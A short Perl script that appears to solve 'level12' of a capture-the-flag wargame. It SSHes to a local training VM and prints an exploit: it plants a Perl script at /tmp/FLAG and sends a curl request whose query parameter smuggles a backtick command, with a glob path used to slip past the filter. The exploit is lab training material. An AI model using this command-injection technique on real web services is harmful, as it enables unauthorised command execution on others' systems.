#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level12";

$inject = "cat level12.pl";
$exploit = "Exploit :\nssh -qp $port $user\@$ip\n\ntouch /tmp/FLAG && chmod 777 /tmp/FLAG\n\n";
$exploit .= "echo '#!/usr/bin/perl\n`getflag | write level12`;' > /tmp/FLAG\n\n";
$exploit .= "curl localhost:4646/?x=\\`/*/FLAG\\`";

print $red, $inject, $reset, "\n";
system("ssh -qp $port $user\@$ip '$inject'");
print $green, $exploit, $reset, "\n";
